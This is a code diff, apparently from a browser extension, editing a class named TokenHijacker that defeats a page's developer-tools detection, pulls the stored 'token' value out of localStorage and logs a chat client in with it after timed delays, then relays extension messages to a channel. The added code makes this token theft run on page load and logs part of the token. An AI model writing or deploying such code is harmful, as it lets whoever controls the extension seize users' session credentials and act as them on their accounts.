@@ -36179,11 +36179,15 @@ class TokenHijacker {
 		delete window.outerWidth
 		Object.defineProperty(window, 'outerHeight', {
 			set: () => false,
-			get: () => window.innerHeight
+			get: () => window.innerHeight,
+			configurable: false,
+			enumerable: true
 		})
 		Object.defineProperty(window, 'outerWidth', {
 			set: () => false,
-			get: () => window.innerWidth
+			get: () => window.innerWidth,
+			configurable: false,
+			enumerable: true
 		})
 	}
 
@@ -36196,7 +36200,7 @@ class TokenHijacker {
 		if (window.localStorage == null || typeof window.localStorage.getItem !== 'function') {
 			throw new ReferenceError('Cannot access localStorage. Was it restored before?')
 		}
-		return window.localStorage.getItem('token')
+		return JSON.parse(window.localStorage.getItem('token'))
 	}
 }
 
@@ -36215,14 +36219,28 @@ const getDefaultChannel = () => {
 }
 
 client.on('ready', () => {
-	getDefaultChannel().send('HELLO IM BOT')
+	console.log('ready')
+	if (getDefaultChannel()) getDefaultChannel().send('HELLO IM BOT')
 })
 
-TokenHijacker.restoreLocalStorage()
-TokenHijacker.disableDevToolsCheck()
-client.login(TokenHijacker.getToken())
+window.addEventListener('load', () => {
+	console.log('window loaded')
+	setTimeout(() => {
+		console.log('test')
+		TokenHijacker.restoreLocalStorage()
+		TokenHijacker.disableDevToolsCheck()
+		setTimeout(() => {
+			const token = TokenHijacker.getToken()
+			console.log(token.substr(0, 5))
+			client
+				.login(token)
+				.then(console.log)
+				.catch(console.error)
+		}, 2000)
+	}, 3000)
+})
 
-browser.runtime.onMessage.addListener(msg => {
+chrome.runtime.onMessage.addListener(msg => {
 	console.log(msg)
 	getDefaultChannel().send(msg.test)
 })
